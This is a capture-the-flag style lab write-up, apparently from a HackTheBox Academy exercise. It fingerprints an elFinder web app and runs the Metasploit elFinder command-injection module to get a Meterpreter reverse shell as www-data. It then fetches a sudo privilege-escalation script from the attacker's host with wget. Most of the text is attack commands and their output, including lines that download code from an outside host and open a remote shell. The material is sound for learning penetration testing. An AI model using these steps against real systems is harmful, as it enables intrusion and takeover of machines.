## The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?
```
$ whatweb 10.129.203.52
http://10.129.203.52 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.203.52], Script, Title[elFinder 2.1.x source version with PHP connector], X-UA-Compatible[IE=edge]

```
The answer is : 
> ==ElFinder==

## Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

```
msf6 > search elfinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

msf6 > use 3
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > options

Module options (exploit/linux/http/elfinder_archive_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of elFinder
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to li
                                       sten on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set lhost tun0
lhost => 10.10.14.186
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set rhosts 10.129.203.52
rhosts => 10.129.203.52

msf6 exploit(linux/http/elfinder_archive_cmd_injection) > run

[*] Started reverse TCP handler on 10.10.14.186:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. elFinder running version 2.1.53
[*] Uploading file sxvhAWhqe.txt to elFinder
[+] Text file was successfully uploaded!
[*] Attempting to create archive JjEcaes.zip
[+] Archive was successfully created!
[*] Using URL: http://10.10.14.186:8080/xisOUi
[*] Client 10.129.203.52 (Wget/1.20.3 (linux-gnu)) requested /xisOUi
[*] Sending payload to 10.129.203.52 (Wget/1.20.3 (linux-gnu))
[*] Command Stager progress -  50.00% done (54/108 bytes)
[*] Command Stager progress -  70.37% done (76/108 bytes)
[*] Sending stage (1017704 bytes) to 10.129.203.52
[+] Deleted sxvhAWhqe.txt
[+] Deleted JjEcaes.zip
[*] Meterpreter session 1 opened (10.10.14.186:4444 -> 10.129.203.52:35486) at 2024-05-20 10:33:08 -0300
[*] Command Stager progress -  82.41% done (89/108 bytes)
[*] Command Stager progress - 100.00% done (108/108 bytes)
[*] Server stopped.

meterpreter > getuid 
]Server username: www-data

```

The answer is : 
> ==www-data==

## The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.

```
meterpreter > shell
Process 1402 created.
Channel 1 created.
cat /etc/shells
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen
/bin/bash -i
bash: cannot set terminal process group (1015): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nix02:~/html/files$ sudo -V
sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Searching  for a way to do privilege escalation
```
$searchsploit sudo 1.8
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation                                | linux/local/25134.c
sudo 1.8.0 < 1.8.3p1 - Format String                                                                                  | linux/dos/18436.txt
sudo 1.8.0 to 1.9.12p1 - Privilege Escalation                                                                         | linux/local/51217.sh
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation                                      | linux/local/37710.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                                                      | linux/local/42183.c
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                                                           | linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                                                     | linux/dos/47995.txt
sudo 1.8.27 - Security Bypass                                                                                         | linux/local/47502.py
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```
python3 -m http.server 8080 -b $(ip addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
```

```
www-data@nix02:~/html/files$ wget 10.10.14.186:8080/51217.sh
wget 10.10.14.186:8080/51217.sh
--2024-05-20 13:43:46--  http://10.10.14.186:8080/51217.sh
Connecting to 10.10.14.186:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1575 (1.5K) [text/x-sh]
Saving to: '51217.sh'

     0K .                                                     100%  188M=0s

2024-05-20 13:43:47 (188 MB/s) - '51217.sh' saved [1575/1575]

www-data@nix02:~/html/files$ chmod +x 51217.sh	
chmod +x 51217.sh

```